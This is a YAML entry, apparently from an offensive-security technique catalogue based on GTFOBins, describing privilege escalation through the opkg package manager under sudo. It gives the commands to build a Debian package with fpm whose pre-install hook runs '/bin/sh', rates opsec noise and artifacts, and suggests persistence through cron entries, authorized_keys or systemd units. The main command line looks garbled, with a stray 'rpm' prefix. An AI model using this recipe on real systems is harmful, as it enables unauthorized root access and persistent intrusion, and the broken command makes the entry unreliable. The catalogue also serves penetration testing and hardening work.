---
name: opkg
capabilities:
- exec
- spawn
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: rpm opkg install x_1.0_all.deb
  notes: |-
    Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

    ```
    echo 'exec /bin/sh' >x.sh
    fpm -n x -s dir -t deb -a all --before-install x.sh .
    ```
references:
- https://gtfobins.github.io/gtfobins/opkg/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
